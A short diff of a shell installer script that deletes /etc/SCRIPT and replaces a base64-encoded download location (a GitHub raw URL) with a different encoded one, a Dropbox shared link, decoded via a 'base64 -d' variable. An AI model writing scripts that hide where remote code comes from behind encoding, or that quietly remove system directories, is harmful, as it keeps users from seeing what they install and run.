@@ -2,7 +2,7 @@
 IVAR="/etc/http-instas"
 SCPT_DIR="/etc/SCRIPT"
 [[ -d $SCPT_DIR ]] && rm -rf $SCPT_DIR
-SCPresq="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VWQUlBaGlxbmhhaWphaS9ub3Zhai9lbnNheWFyL0NnaG1hbGwvbWFzdGVyLw=="
+SCPresq="aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2gvNWczOHd0bnR6NW9veWtiL0FBQnJsOGRiRjBfMmZtNzhIU29tdTFtM2E/ZGw9MA=="
 SUB_DOM='base64 -d'
 
 #CORES
